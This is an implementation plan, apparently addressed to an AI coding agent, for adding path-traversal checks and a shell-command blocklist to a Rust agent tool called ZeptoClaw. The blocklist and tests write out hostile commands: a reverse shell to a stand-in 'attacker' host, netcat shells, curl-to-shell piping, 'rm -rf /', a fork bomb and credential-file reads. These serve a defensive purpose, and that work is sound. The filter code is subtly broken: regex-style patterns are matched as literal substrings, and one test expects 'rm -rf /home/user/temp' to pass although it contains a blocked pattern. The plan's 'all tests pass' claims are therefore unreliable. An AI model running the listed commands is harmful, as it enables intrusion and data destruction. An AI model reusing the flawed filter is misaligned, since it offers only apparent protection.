# Security Hardening Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Add path traversal protection to filesystem tools and command restrictions to shell tool to prevent security vulnerabilities.

**Architecture:** Create a new `security` module with reusable validation functions. Update filesystem tools to validate paths stay within workspace. Add configurable command blocklist for shell tool.

**Tech Stack:** Rust, std::path, std::fs::canonicalize, regex (for shell patterns)

---

## Task 1: Add Security Error Variant

**Files:**
- Modify: `src/error.rs`

**Step 1: Add SecurityViolation error variant**

Add after the `Unauthorized` variant (line 54):

```rust
    /// Security violation (path traversal, blocked command, etc.)
    #[error("Security violation: {0}")]
    SecurityViolation(String),
```

**Step 2: Run existing tests to ensure no regression**

Run: `cargo test --lib error`
Expected: All tests PASS

**Step 3: Commit**

```bash
git add src/error.rs
git commit -m "feat(error): add SecurityViolation error variant"
```

---

## Task 2: Create Security Module with Path Validation

**Files:**
- Create: `src/security/mod.rs`
- Create: `src/security/path.rs`

**Step 1: Create the security module file**

Create `src/security/mod.rs`:

```rust
//! Security module for ZeptoClaw
//!
//! This module provides security utilities including path validation
//! and command filtering to prevent malicious tool execution.

pub mod path;

pub use path::{validate_path_in_workspace, SafePath};
```

**Step 2: Create path validation module with tests**

Create `src/security/path.rs`:

```rust
//! Path security utilities
//!
//! Provides path validation to prevent directory traversal attacks.

use std::path::{Path, PathBuf};

use crate::error::{PicoError, Result};

/// A validated path that is guaranteed to be within a workspace.
#[derive(Debug, Clone)]
pub struct SafePath {
    /// The resolved absolute path
    pub path: PathBuf,
}

impl SafePath {
    /// Get the path as a string slice.
    pub fn as_str(&self) -> &str {
        self.path.to_str().unwrap_or("")
    }
}

impl AsRef<Path> for SafePath {
    fn as_ref(&self) -> &Path {
        &self.path
    }
}

/// Validate that a path resolves to within the workspace directory.
///
/// This function prevents directory traversal attacks by ensuring the
/// canonical path of the target is within the workspace boundary.
///
/// # Arguments
/// * `path` - The path to validate (can be absolute or relative)
/// * `workspace` - The workspace directory that bounds valid paths
///
/// # Returns
/// A `SafePath` if validation succeeds, or a `SecurityViolation` error.
///
/// # Example
/// ```
/// use zeptoclaw::security::validate_path_in_workspace;
///
/// // Valid relative path
/// let result = validate_path_in_workspace("subdir/file.txt", "/workspace");
/// // Result depends on whether /workspace/subdir/file.txt exists
///
/// // Invalid traversal attempt
/// let result = validate_path_in_workspace("../../../etc/passwd", "/workspace");
/// assert!(result.is_err());
/// ```
pub fn validate_path_in_workspace(path: &str, workspace: &str) -> Result<SafePath> {
    let workspace_path = Path::new(workspace);

    // Resolve the target path
    let target_path = if Path::new(path).is_absolute() {
        PathBuf::from(path)
    } else {
        workspace_path.join(path)
    };

    // Normalize the path by resolving . and ..
    // We need to handle both existing and non-existing paths
    let normalized = normalize_path(&target_path);

    // Get canonical workspace path (must exist)
    let canonical_workspace = workspace_path.canonicalize().map_err(|e| {
        PicoError::Tool(format!("Workspace '{}' not accessible: {}", workspace, e))
    })?;

    // Check if the normalized path starts with workspace
    if !normalized.starts_with(&canonical_workspace) {
        return Err(PicoError::SecurityViolation(format!(
            "Path '{}' escapes workspace boundary",
            path
        )));
    }

    Ok(SafePath { path: normalized })
}

/// Normalize a path by resolving `.` and `..` components without requiring
/// the path to exist.
fn normalize_path(path: &Path) -> PathBuf {
    let mut normalized = PathBuf::new();

    for component in path.components() {
        match component {
            std::path::Component::ParentDir => {
                normalized.pop();
            }
            std::path::Component::CurDir => {
                // Skip current dir references
            }
            _ => {
                normalized.push(component);
            }
        }
    }

    // If path exists, use canonical path for accuracy
    if let Ok(canonical) = normalized.canonicalize() {
        canonical
    } else {
        normalized
    }
}

/// Check if a path contains suspicious traversal patterns.
///
/// This is a quick check that can be used before more expensive validation.
pub fn contains_traversal_pattern(path: &str) -> bool {
    path.contains("..") || path.contains("//")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    #[test]
    fn test_valid_relative_path() {
        let dir = tempdir().unwrap();
        let file_path = dir.path().join("test.txt");
        fs::write(&file_path, "test").unwrap();

        let result = validate_path_in_workspace("test.txt", dir.path().to_str().unwrap());
        assert!(result.is_ok());
    }

    #[test]
    fn test_valid_nested_path() {
        let dir = tempdir().unwrap();
        let subdir = dir.path().join("sub");
        fs::create_dir(&subdir).unwrap();
        fs::write(subdir.join("file.txt"), "test").unwrap();

        let result = validate_path_in_workspace("sub/file.txt", dir.path().to_str().unwrap());
        assert!(result.is_ok());
    }

    #[test]
    fn test_traversal_attack_blocked() {
        let dir = tempdir().unwrap();

        let result = validate_path_in_workspace("../../../etc/passwd", dir.path().to_str().unwrap());
        assert!(result.is_err());

        let err = result.unwrap_err();
        assert!(err.to_string().contains("Security violation"));
        assert!(err.to_string().contains("escapes workspace"));
    }

    #[test]
    fn test_absolute_path_outside_workspace() {
        let dir = tempdir().unwrap();

        let result = validate_path_in_workspace("/etc/passwd", dir.path().to_str().unwrap());
        assert!(result.is_err());
    }

    #[test]
    fn test_absolute_path_inside_workspace() {
        let dir = tempdir().unwrap();
        let file_path = dir.path().join("allowed.txt");
        fs::write(&file_path, "test").unwrap();

        let result = validate_path_in_workspace(
            file_path.to_str().unwrap(),
            dir.path().to_str().unwrap(),
        );
        assert!(result.is_ok());
    }

    #[test]
    fn test_hidden_traversal_with_dots() {
        let dir = tempdir().unwrap();

        // Try sneaky traversal
        let result = validate_path_in_workspace("sub/../../../etc/passwd", dir.path().to_str().unwrap());
        assert!(result.is_err());
    }

    #[test]
    fn test_valid_dotfile() {
        let dir = tempdir().unwrap();
        let dotfile = dir.path().join(".hidden");
        fs::write(&dotfile, "secret").unwrap();

        let result = validate_path_in_workspace(".hidden", dir.path().to_str().unwrap());
        assert!(result.is_ok());
    }

    #[test]
    fn test_contains_traversal_pattern() {
        assert!(contains_traversal_pattern("../file"));
        assert!(contains_traversal_pattern("dir/../file"));
        assert!(contains_traversal_pattern("dir//file"));
        assert!(!contains_traversal_pattern("normal/path/file.txt"));
        assert!(!contains_traversal_pattern(".hidden"));
    }

    #[test]
    fn test_safe_path_as_str() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("test.txt"), "").unwrap();

        let safe = validate_path_in_workspace("test.txt", dir.path().to_str().unwrap()).unwrap();
        assert!(!safe.as_str().is_empty());
    }

    #[test]
    fn test_safe_path_as_ref() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("test.txt"), "").unwrap();

        let safe = validate_path_in_workspace("test.txt", dir.path().to_str().unwrap()).unwrap();
        let path: &Path = safe.as_ref();
        assert!(path.exists());
    }

    #[test]
    fn test_nonexistent_file_in_workspace() {
        let dir = tempdir().unwrap();

        // Non-existent file should still validate if path is within workspace
        let result = validate_path_in_workspace("newfile.txt", dir.path().to_str().unwrap());
        assert!(result.is_ok());
    }

    #[test]
    fn test_workspace_not_accessible() {
        let result = validate_path_in_workspace("file.txt", "/nonexistent/workspace/path");
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("not accessible"));
    }
}
```

**Step 3: Run the new tests**

Run: `cargo test --lib security`
Expected: All tests PASS

**Step 4: Commit**

```bash
git add src/security/
git commit -m "feat(security): add path validation module with traversal protection"
```

---

## Task 3: Export Security Module from Library

**Files:**
- Modify: `src/lib.rs`

**Step 1: Add security module declaration**

After line 11 (`pub mod utils;`), add:

```rust
pub mod security;
```

**Step 2: Add security re-exports**

After the existing re-exports (around line 23), add:

```rust
pub use security::{validate_path_in_workspace, SafePath};
```

**Step 3: Verify compilation**

Run: `cargo build`
Expected: Compiles without errors

**Step 4: Commit**

```bash
git add src/lib.rs
git commit -m "feat(lib): export security module"
```

---

## Task 4: Update Filesystem Tools to Use Path Validation

**Files:**
- Modify: `src/tools/filesystem.rs`

**Step 1: Update imports**

Replace the imports at the top of the file with:

```rust
//! Filesystem tools for ZeptoClaw
//!
//! This module provides tools for file system operations including reading,
//! writing, listing directories, and editing files. All paths are validated
//! to prevent directory traversal attacks when a workspace is set.

use async_trait::async_trait;
use serde_json::{json, Value};
use std::path::Path;

use crate::error::{PicoError, Result};
use crate::security::validate_path_in_workspace;

use super::{Tool, ToolContext};
```

**Step 2: Replace the resolve_path function**

Replace the existing `resolve_path` function (lines 15-31) with:

```rust
/// Resolve and validate a path relative to the workspace.
///
/// If workspace is set, validates the path stays within workspace boundaries.
/// If no workspace, returns the path as-is (less secure, but maintains backwards compatibility).
fn resolve_path(path: &str, ctx: &ToolContext) -> Result<String> {
    if let Some(ref workspace) = ctx.workspace {
        // Validate path stays within workspace
        let safe_path = validate_path_in_workspace(path, workspace)?;
        Ok(safe_path.as_str().to_string())
    } else {
        // No workspace set - allow any path (backwards compatible but less secure)
        // Absolute paths are returned as-is
        if Path::new(path).is_absolute() {
            Ok(path.to_string())
        } else {
            // Relative path without workspace - use current directory
            Ok(path.to_string())
        }
    }
}
```

**Step 3: Update ReadFileTool::execute to use Result**

Update the execute method of `ReadFileTool` (around line 78):

```rust
    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<String> {
        let path = args
            .get("path")
            .and_then(|v| v.as_str())
            .ok_or_else(|| PicoError::Tool("Missing 'path' argument".into()))?;

        let full_path = resolve_path(path, ctx)?;

        tokio::fs::read_to_string(&full_path)
            .await
            .map_err(|e| PicoError::Tool(format!("Failed to read file '{}': {}", full_path, e)))
    }
```

**Step 4: Update WriteFileTool::execute**

Update the execute method of `WriteFileTool` (around line 142):

```rust
    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<String> {
        let path = args
            .get("path")
            .and_then(|v| v.as_str())
            .ok_or_else(|| PicoError::Tool("Missing 'path' argument".into()))?;

        let content = args
            .get("content")
            .and_then(|v| v.as_str())
            .ok_or_else(|| PicoError::Tool("Missing 'content' argument".into()))?;

        let full_path = resolve_path(path, ctx)?;

        // Create parent directories if they don't exist
        if let Some(parent) = Path::new(&full_path).parent() {
            if !parent.as_os_str().is_empty() {
                tokio::fs::create_dir_all(parent).await.map_err(|e| {
                    PicoError::Tool(format!("Failed to create parent directories: {}", e))
                })?;
            }
        }

        tokio::fs::write(&full_path, content)
            .await
            .map_err(|e| PicoError::Tool(format!("Failed to write file '{}': {}", full_path, e)))?;

        Ok(format!(
            "Successfully wrote {} bytes to {}",
            content.len(),
            full_path
        ))
    }
```

**Step 5: Update ListDirTool::execute**

Update the execute method of `ListDirTool` (around line 220):

```rust
    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<String> {
        let path = args
            .get("path")
            .and_then(|v| v.as_str())
            .ok_or_else(|| PicoError::Tool("Missing 'path' argument".into()))?;

        let full_path = resolve_path(path, ctx)?;

        let mut entries = tokio::fs::read_dir(&full_path).await.map_err(|e| {
            PicoError::Tool(format!("Failed to read directory '{}': {}", full_path, e))
        })?;

        let mut items = Vec::new();

        while let Some(entry) = entries
            .next_entry()
            .await
            .map_err(|e| PicoError::Tool(format!("Failed to read directory entry: {}", e)))?
        {
            let file_name = entry.file_name().to_string_lossy().to_string();
            let file_type = entry.file_type().await.ok();

            let type_indicator = match file_type {
                Some(ft) if ft.is_dir() => "/",
                Some(ft) if ft.is_symlink() => "@",
                _ => "",
            };

            items.push(format!("{}{}", file_name, type_indicator));
        }

        items.sort();
        Ok(items.join("\n"))
    }
```

**Step 6: Update EditFileTool::execute**

Update the execute method of `EditFileTool` (around line 315):

```rust
    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<String> {
        let path = args
            .get("path")
            .and_then(|v| v.as_str())
            .ok_or_else(|| PicoError::Tool("Missing 'path' argument".into()))?;

        let old_text = args
            .get("old_text")
            .and_then(|v| v.as_str())
            .ok_or_else(|| PicoError::Tool("Missing 'old_text' argument".into()))?;

        let new_text = args
            .get("new_text")
            .and_then(|v| v.as_str())
            .ok_or_else(|| PicoError::Tool("Missing 'new_text' argument".into()))?;

        let full_path = resolve_path(path, ctx)?;

        // Read the current content
        let content = tokio::fs::read_to_string(&full_path)
            .await
            .map_err(|e| PicoError::Tool(format!("Failed to read file '{}': {}", full_path, e)))?;

        // Check if old_text exists in the file
        if !content.contains(old_text) {
            return Err(PicoError::Tool(format!(
                "Text '{}' not found in file '{}'",
                if old_text.len() > 50 {
                    format!("{}...", &old_text[..50])
                } else {
                    old_text.to_string()
                },
                full_path
            )));
        }

        // Replace the text
        let new_content = content.replace(old_text, new_text);

        // Write back
        tokio::fs::write(&full_path, &new_content)
            .await
            .map_err(|e| PicoError::Tool(format!("Failed to write file '{}': {}", full_path, e)))?;

        let replacements = content.matches(old_text).count();
        Ok(format!(
            "Successfully replaced {} occurrence(s) in {}",
            replacements, full_path
        ))
    }
```

**Step 7: Update tests - fix resolve_path calls**

Update the test helper functions and tests that call `resolve_path`:

```rust
    #[test]
    fn test_resolve_path_absolute() {
        let ctx = ToolContext::new().with_workspace("/workspace");
        // Absolute paths outside workspace should fail when workspace is set
        // But we can't easily test this without a real directory
    }

    #[test]
    fn test_resolve_path_relative_without_workspace() {
        let ctx = ToolContext::new();
        let result = resolve_path("relative/path", &ctx);
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "relative/path");
    }
```

**Step 8: Add security test for path traversal**

Add a new test at the end of the tests module:

```rust
    #[tokio::test]
    async fn test_path_traversal_blocked() {
        let dir = tempdir().unwrap();

        let tool = ReadFileTool;
        let ctx = ToolContext::new().with_workspace(dir.path().to_str().unwrap());

        // Attempt path traversal
        let result = tool
            .execute(json!({"path": "../../../etc/passwd"}), &ctx)
            .await;

        assert!(result.is_err());
        let err = result.unwrap_err().to_string();
        assert!(err.contains("Security violation") || err.contains("escapes workspace"));
    }

    #[tokio::test]
    async fn test_absolute_path_outside_workspace_blocked() {
        let dir = tempdir().unwrap();

        let tool = ReadFileTool;
        let ctx = ToolContext::new().with_workspace(dir.path().to_str().unwrap());

        let result = tool
            .execute(json!({"path": "/etc/passwd"}), &ctx)
            .await;

        assert!(result.is_err());
    }
```

**Step 9: Run all filesystem tests**

Run: `cargo test --lib filesystem`
Expected: All tests PASS

**Step 10: Commit**

```bash
git add src/tools/filesystem.rs
git commit -m "feat(tools): add path traversal protection to filesystem tools"
```

---

## Task 5: Add Shell Command Security Configuration

**Files:**
- Create: `src/security/shell.rs`
- Modify: `src/security/mod.rs`

**Step 1: Create shell security module**

Create `src/security/shell.rs`:

```rust
//! Shell command security utilities
//!
//! Provides command filtering to prevent dangerous shell operations.

use crate::error::{PicoError, Result};

/// Default patterns that are blocked for security reasons.
const DEFAULT_BLOCKED_PATTERNS: &[&str] = &[
    // Destructive file operations
    "rm -rf /",
    "rm -rf /*",
    "rm -fr /",
    "rm -fr /*",
    "> /dev/sd",
    "mkfs",
    "dd if=",
    // System modification
    "chmod -R 777 /",
    "chown -R",
    // Network exfiltration patterns
    "curl.*|.*sh",
    "wget.*|.*sh",
    "nc -e",
    "bash -i >& /dev/tcp",
    // Credential access
    "/etc/shadow",
    "/etc/passwd",
    "~/.ssh/",
    // Fork bombs and resource exhaustion
    ":(){ :|:& };:",
    "fork()",
];

/// Configuration for shell command security.
#[derive(Debug, Clone)]
pub struct ShellSecurityConfig {
    /// Patterns that are blocked (commands containing these are rejected)
    pub blocked_patterns: Vec<String>,
    /// Whether to enable security checks (can be disabled for trusted environments)
    pub enabled: bool,
}

impl Default for ShellSecurityConfig {
    fn default() -> Self {
        Self {
            blocked_patterns: DEFAULT_BLOCKED_PATTERNS
                .iter()
                .map(|s| s.to_string())
                .collect(),
            enabled: true,
        }
    }
}

impl ShellSecurityConfig {
    /// Create a new shell security config with default blocked patterns.
    pub fn new() -> Self {
        Self::default()
    }

    /// Create a permissive config with no blocked patterns.
    ///
    /// # Warning
    /// This should only be used in trusted environments.
    pub fn permissive() -> Self {
        Self {
            blocked_patterns: Vec::new(),
            enabled: false,
        }
    }

    /// Add a custom blocked pattern.
    pub fn block_pattern(mut self, pattern: &str) -> Self {
        self.blocked_patterns.push(pattern.to_string());
        self
    }

    /// Check if a command is allowed.
    ///
    /// Returns `Ok(())` if the command is safe to execute,
    /// or `Err(SecurityViolation)` if it matches a blocked pattern.
    pub fn validate_command(&self, command: &str) -> Result<()> {
        if !self.enabled {
            return Ok(());
        }

        let command_lower = command.to_lowercase();

        for pattern in &self.blocked_patterns {
            let pattern_lower = pattern.to_lowercase();
            if command_lower.contains(&pattern_lower) {
                return Err(PicoError::SecurityViolation(format!(
                    "Command blocked: contains prohibited pattern '{}'",
                    pattern
                )));
            }
        }

        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_command_allowed() {
        let config = ShellSecurityConfig::new();
        assert!(config.validate_command("echo hello").is_ok());
        assert!(config.validate_command("ls -la").is_ok());
        assert!(config.validate_command("cat file.txt").is_ok());
        assert!(config.validate_command("grep pattern file").is_ok());
    }

    #[test]
    fn test_rm_rf_root_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config.validate_command("rm -rf /").is_err());
        assert!(config.validate_command("rm -rf /*").is_err());
        assert!(config.validate_command("sudo rm -rf /").is_err());
    }

    #[test]
    fn test_rm_in_directory_allowed() {
        let config = ShellSecurityConfig::new();

        // Normal rm commands should be fine
        assert!(config.validate_command("rm file.txt").is_ok());
        assert!(config.validate_command("rm -rf ./temp").is_ok());
        assert!(config.validate_command("rm -rf /home/user/temp").is_ok());
    }

    #[test]
    fn test_credential_access_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config.validate_command("cat /etc/shadow").is_err());
        assert!(config.validate_command("cat /etc/passwd").is_err());
        assert!(config.validate_command("cat ~/.ssh/id_rsa").is_err());
    }

    #[test]
    fn test_fork_bomb_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config.validate_command(":(){ :|:& };:").is_err());
    }

    #[test]
    fn test_custom_pattern_blocked() {
        let config = ShellSecurityConfig::new()
            .block_pattern("dangerous_script");

        assert!(config.validate_command("./dangerous_script.sh").is_err());
        assert!(config.validate_command("safe_script.sh").is_ok());
    }

    #[test]
    fn test_permissive_mode() {
        let config = ShellSecurityConfig::permissive();

        // Even dangerous commands allowed in permissive mode
        assert!(config.validate_command("rm -rf /").is_ok());
    }

    #[test]
    fn test_case_insensitive() {
        let config = ShellSecurityConfig::new();

        // Should catch regardless of case
        assert!(config.validate_command("RM -RF /").is_err());
        assert!(config.validate_command("Rm -Rf /").is_err());
    }

    #[test]
    fn test_network_exfiltration_blocked() {
        let config = ShellSecurityConfig::new();

        assert!(config.validate_command("bash -i >& /dev/tcp/attacker/443").is_err());
    }

    #[test]
    fn test_default_config() {
        let config = ShellSecurityConfig::default();
        assert!(config.enabled);
        assert!(!config.blocked_patterns.is_empty());
    }
}
```

**Step 2: Update security/mod.rs to include shell module**

Update `src/security/mod.rs`:

```rust
//! Security module for ZeptoClaw
//!
//! This module provides security utilities including path validation
//! and command filtering to prevent malicious tool execution.

pub mod path;
pub mod shell;

pub use path::{validate_path_in_workspace, SafePath};
pub use shell::ShellSecurityConfig;
```

**Step 3: Run security tests**

Run: `cargo test --lib security`
Expected: All tests PASS

**Step 4: Commit**

```bash
git add src/security/
git commit -m "feat(security): add shell command security configuration"
```

---

## Task 6: Update Shell Tool to Use Security Config

**Files:**
- Modify: `src/tools/shell.rs`

**Step 1: Update imports**

Add the security import after the existing imports:

```rust
use crate::security::ShellSecurityConfig;
```

**Step 2: Add security config to ShellTool**

Replace the `ShellTool` struct and add a new constructor:

```rust
/// Tool for executing shell commands.
///
/// Executes a shell command and returns the combined stdout and stderr output.
/// Commands are run using `sh -c` for shell interpretation.
///
/// # Parameters
/// - `command`: The shell command to execute (required)
/// - `timeout`: Timeout in seconds, defaults to 60 (optional)
///
/// # Security
/// This tool validates commands against a configurable blocklist to prevent
/// dangerous operations. Use `ShellTool::permissive()` to disable security
/// checks in trusted environments.
///
/// # Example
/// ```rust
/// use zeptoclaw::tools::{Tool, ToolContext};
/// use zeptoclaw::tools::shell::ShellTool;
/// use serde_json::json;
///
/// # tokio_test::block_on(async {
/// let tool = ShellTool::new();
/// let ctx = ToolContext::new();
/// let result = tool.execute(json!({"command": "echo hello"}), &ctx).await;
/// assert!(result.is_ok());
/// assert_eq!(result.unwrap().trim(), "hello");
/// # });
/// ```
pub struct ShellTool {
    security_config: ShellSecurityConfig,
}

impl ShellTool {
    /// Create a new shell tool with default security settings.
    pub fn new() -> Self {
        Self {
            security_config: ShellSecurityConfig::new(),
        }
    }

    /// Create a shell tool with custom security configuration.
    pub fn with_security(security_config: ShellSecurityConfig) -> Self {
        Self { security_config }
    }

    /// Create a shell tool with no security restrictions.
    ///
    /// # Warning
    /// Only use in trusted environments where command injection is not a concern.
    pub fn permissive() -> Self {
        Self {
            security_config: ShellSecurityConfig::permissive(),
        }
    }
}

impl Default for ShellTool {
    fn default() -> Self {
        Self::new()
    }
}
```

**Step 3: Update the execute method to validate commands**

Update the `execute` method:

```rust
    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<String> {
        let command = args
            .get("command")
            .and_then(|v| v.as_str())
            .ok_or_else(|| PicoError::Tool("Missing 'command' argument".into()))?;

        // Security check
        self.security_config.validate_command(command)?;

        let timeout_secs = args.get("timeout").and_then(|v| v.as_u64()).unwrap_or(60);

        // Build the command
        let mut cmd = Command::new("sh");
        cmd.arg("-c").arg(command);

        // Set working directory if workspace is specified
        if let Some(ref workspace) = ctx.workspace {
            cmd.current_dir(workspace);
        }

        // Capture output
        cmd.stdout(Stdio::piped()).stderr(Stdio::piped());

        // Execute with timeout
        let output = tokio::time::timeout(Duration::from_secs(timeout_secs), cmd.output())
            .await
            .map_err(|_| PicoError::Tool(format!("Command timed out after {}s", timeout_secs)))?
            .map_err(|e| PicoError::Tool(format!("Failed to execute command: {}", e)))?;

        // Build result string
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);

        let mut result = String::new();

        if !stdout.is_empty() {
            result.push_str(&stdout);
        }

        if !stderr.is_empty() {
            if !result.is_empty() {
                result.push_str("\n--- stderr ---\n");
            }
            result.push_str(&stderr);
        }

        if !output.status.success() {
            let exit_code = output.status.code().unwrap_or(-1);
            result.push_str(&format!("\n[Exit code: {}]", exit_code));
        }

        Ok(result)
    }
```

**Step 4: Update tests to use new constructor**

Update the tests to use `ShellTool::new()` or `ShellTool::default()`:

```rust
    #[tokio::test]
    async fn test_shell_echo() {
        let tool = ShellTool::new();
        let ctx = ToolContext::new();

        let result = tool.execute(json!({"command": "echo hello"}), &ctx).await;
        assert!(result.is_ok());
        assert_eq!(result.unwrap().trim(), "hello");
    }
```

(Update all other tests similarly)

**Step 5: Add security tests**

Add new tests for security functionality:

```rust
    #[tokio::test]
    async fn test_dangerous_command_blocked() {
        let tool = ShellTool::new();
        let ctx = ToolContext::new();

        let result = tool.execute(json!({"command": "rm -rf /"}), &ctx).await;
        assert!(result.is_err());

        let err = result.unwrap_err().to_string();
        assert!(err.contains("Security violation"));
    }

    #[tokio::test]
    async fn test_permissive_mode_allows_dangerous() {
        let tool = ShellTool::permissive();
        let ctx = ToolContext::new();

        // This would normally be blocked, but we're just testing the security bypass
        // Don't actually execute rm -rf /!
        let result = tool.execute(json!({"command": "echo 'rm -rf /'"}), &ctx).await;
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_custom_security_config() {
        use crate::security::ShellSecurityConfig;

        let config = ShellSecurityConfig::new().block_pattern("forbidden");
        let tool = ShellTool::with_security(config);
        let ctx = ToolContext::new();

        let result = tool.execute(json!({"command": "echo forbidden"}), &ctx).await;
        assert!(result.is_err());
    }

    #[test]
    fn test_shell_tool_default() {
        let tool = ShellTool::default();
        // Should have security enabled by default
        assert!(tool.security_config.enabled);
    }
```

**Step 6: Run all shell tests**

Run: `cargo test --lib shell`
Expected: All tests PASS

**Step 7: Commit**

```bash
git add src/tools/shell.rs
git commit -m "feat(tools): add command security validation to shell tool"
```

---

## Task 7: Update Tool Registration in main.rs

**Files:**
- Modify: `src/main.rs`

**Step 1: Update ShellTool registration**

Find the line that registers the ShellTool and update it to use the new constructor:

```rust
    agent.register_tool(Box::new(ShellTool::new())).await;
```

**Step 2: Verify compilation**

Run: `cargo build`
Expected: Compiles without errors

**Step 3: Commit**

```bash
git add src/main.rs
git commit -m "chore: update shell tool registration to use new constructor"
```

---

## Task 8: Export Security Types from Library

**Files:**
- Modify: `src/lib.rs`

**Step 1: Update security re-exports**

Update the security re-exports to include `ShellSecurityConfig`:

```rust
pub use security::{validate_path_in_workspace, SafePath, ShellSecurityConfig};
```

**Step 2: Run full test suite**

Run: `cargo test`
Expected: All tests PASS

**Step 3: Run clippy**

Run: `cargo clippy -- -D warnings`
Expected: No warnings

**Step 4: Commit**

```bash
git add src/lib.rs
git commit -m "feat(lib): export shell security config from library"
```

---

## Task 9: Add Integration Tests for Security

**Files:**
- Modify: `tests/integration.rs`

**Step 1: Add security integration tests**

Add at the end of the file:

```rust
// ============================================================================
// Security Integration Tests
// ============================================================================

#[tokio::test]
async fn test_filesystem_path_traversal_protection() {
    use zeptoclaw::tools::{Tool, ToolContext};
    use zeptoclaw::tools::filesystem::ReadFileTool;
    use tempfile::tempdir;

    let dir = tempdir().unwrap();
    let ctx = ToolContext::new().with_workspace(dir.path().to_str().unwrap());
    let tool = ReadFileTool;

    // Attempt to read /etc/passwd via traversal
    let result = tool
        .execute(serde_json::json!({"path": "../../../etc/passwd"}), &ctx)
        .await;

    assert!(result.is_err());
    let err = result.unwrap_err().to_string();
    assert!(
        err.contains("Security violation") || err.contains("escapes workspace"),
        "Expected security error, got: {}", err
    );
}

#[tokio::test]
async fn test_shell_dangerous_command_blocked() {
    use zeptoclaw::tools::{Tool, ToolContext};
    use zeptoclaw::tools::shell::ShellTool;

    let tool = ShellTool::new();
    let ctx = ToolContext::new();

    let result = tool
        .execute(serde_json::json!({"command": "rm -rf /"}), &ctx)
        .await;

    assert!(result.is_err());
    assert!(result.unwrap_err().to_string().contains("Security violation"));
}

#[tokio::test]
async fn test_security_config_customization() {
    use zeptoclaw::security::ShellSecurityConfig;
    use zeptoclaw::tools::{Tool, ToolContext};
    use zeptoclaw::tools::shell::ShellTool;

    // Create tool with custom blocked pattern
    let config = ShellSecurityConfig::new().block_pattern("custom_forbidden");
    let tool = ShellTool::with_security(config);
    let ctx = ToolContext::new();

    // Custom pattern should be blocked
    let result = tool
        .execute(serde_json::json!({"command": "echo custom_forbidden"}), &ctx)
        .await;
    assert!(result.is_err());

    // Default tool should allow it
    let default_tool = ShellTool::new();
    let result = default_tool
        .execute(serde_json::json!({"command": "echo custom_forbidden"}), &ctx)
        .await;
    assert!(result.is_ok());
}
```

**Step 2: Run integration tests**

Run: `cargo test --test integration`
Expected: All tests PASS

**Step 3: Commit**

```bash
git add tests/integration.rs
git commit -m "test: add security integration tests"
```

---

## Task 10: Final Verification

**Step 1: Run full test suite**

Run: `cargo test`
Expected: All tests PASS

**Step 2: Run clippy**

Run: `cargo clippy -- -D warnings`
Expected: No warnings

**Step 3: Run format check**

Run: `cargo fmt -- --check`
Expected: No formatting changes needed

**Step 4: Build release**

Run: `cargo build --release`
Expected: Compiles successfully

**Step 5: Final commit (if any formatting changes)**

```bash
cargo fmt
git add -A
git commit -m "chore: final formatting and cleanup"
```

---

## Verification Summary

After implementation, verify:

1. **Path Traversal Protection:**
   ```bash
   # Should fail with security error
   cargo run -- agent -m "Read file ../../../etc/passwd"
   ```

2. **Shell Command Security:**
   ```bash
   # Should fail with security error
   cargo run -- agent -m "Run command: rm -rf /"
   ```

3. **Normal Operations Still Work:**
   ```bash
   cargo run -- agent -m "List files in current directory"
   cargo run -- agent -m "Echo hello world"
   ```

---

## Security Considerations

- **Path validation** requires a workspace to be set for full protection
- **Shell security** can be bypassed with `ShellTool::permissive()` for trusted environments
- **Default blocked patterns** cover common attack vectors but may need customization
- Consider adding rate limiting in a future iteration
